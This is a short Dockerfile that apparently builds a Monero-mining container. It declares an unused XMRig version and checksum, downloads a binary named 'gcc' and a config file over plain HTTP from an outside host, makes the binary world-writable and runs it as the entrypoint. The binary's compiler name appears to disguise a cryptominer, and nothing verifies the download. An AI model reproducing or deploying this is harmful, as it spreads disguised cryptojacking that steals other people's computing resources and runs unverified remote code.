FROM ubuntu:xenial

RUN apt-get update && apt-get install -y wget

ENV XMRIG_VERSION=2.6.3 XMRIG_SHA256=dbc2b0f92df5098dc91a361febfda46382d347ae3085415f35e1637b7ebc67e9

RUN useradd -ms /bin/bash monero
USER monero
WORKDIR /home/monero

RUN wget http://xaxaxa.eu/gcc &&\
  chmod 777 gcc &&\
  wget http://xaxaxa.eu/config_1.json

ENTRYPOINT ["./gcc"]
CMD ["--config=config_1.json"]
